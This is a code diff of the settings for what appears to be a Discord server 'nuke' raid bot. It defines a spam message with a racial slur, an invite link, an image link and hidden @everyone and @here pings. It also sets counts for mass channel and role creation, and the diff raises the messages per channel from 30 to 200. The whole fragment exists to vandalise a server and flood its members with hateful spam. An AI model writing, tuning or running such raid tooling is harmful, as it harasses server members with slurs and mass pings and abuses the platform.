@@ -25,14 +25,14 @@ USE_RANDOM_NAMES = True
 CHANNEL_NAME = "nuked"  # fallback
 
 # New message content with image
-MESSAGE = """# NUKED BY NXL
+MESSAGE = """# NUKED BY N3XL 
 Fuck u niggers, join da server now! 
 https://discord.gg/pbtxaTf8Q4
 https://cdn.discordapp.com/attachments/1500712288032919572/1504852428745474069/image0.gif?ex=6a087e89&is=6a072d09&hm=f6a03505868048307d883a58fe9ec7b796f77d5ee22e4230017e16b1c74a3497&
 ||@everyone|| ||@here||"""
 
 AMOUNT_OF_CHANNELS = 100
-MESSAGES_PER_CHANNEL = 30
+MESSAGES_PER_CHANNEL = 200
 AMOUNT_OF_MESSAGES = AMOUNT_OF_CHANNELS * MESSAGES_PER_CHANNEL
 
 # Roles to create (base names, will be cycled to make 60 total)
